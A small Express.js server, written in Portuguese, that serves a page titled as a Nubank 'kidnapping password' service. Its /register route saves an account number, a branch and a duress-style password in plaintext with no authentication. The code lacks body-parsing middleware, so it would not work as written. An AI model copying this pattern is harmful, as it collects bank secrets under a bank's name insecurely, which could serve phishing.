const express = require('express');
const app = express();
const router = express.Router();
const User = require('./repository/userRepository');

app.get('/', function(req, res, next) {
    res.render('index', {title: 'Nubank Senha para Sequestro'});
});

app.post('/register', function(req, res, next) {
    var conta = req.body.conta;
    var agencia = req.body.agencia;
    var senhaRoubo = req.body.senhaRoubo;

    var novoUsuario = new User();
    novoUsuario.conta = conta;
    novoUsuario.agencia = agencia;
    novoUsuario.senhaRoubo = senhaRoubo;

    novoUsuario.save(function (err, usuarioSalvo) {
        if(err) {
            console.log(err);
            return res.status(500).send();
        }

        return res.status(200).send();
    });
});

app.listen(40000, () => {
  console.log("app listening at ", 40000)
});
